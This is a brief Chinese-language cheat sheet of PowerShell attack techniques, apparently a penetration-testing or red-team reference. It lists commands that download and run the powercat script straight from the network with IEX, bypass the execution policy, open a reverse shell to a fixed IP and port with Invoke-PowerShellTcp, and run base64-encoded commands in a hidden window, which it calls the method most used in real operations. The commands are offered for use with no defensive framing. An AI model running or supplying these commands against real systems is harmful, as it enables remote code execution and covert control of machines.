1.通过远程下载来执行
<code>
Set-ExecutionPolicy RemoteSigned
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
</code>

2.把ps脚本传到本地后执行
<code>
PowerShell.exe -ep Bypass -File d:\powercat.ps1
</code>

3.本地交互式执行
<code>
E:\>PowerShell.exe -ExecutionPolicy Bypass 
Invoke-PowerShellTcp -Reverse -IPAddress 10.18.180.18 -Port 4444
</code>

4.把ps脚本编码成base64来执行[实战用的最多]
<code>
powershell -ep bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc 
</code>
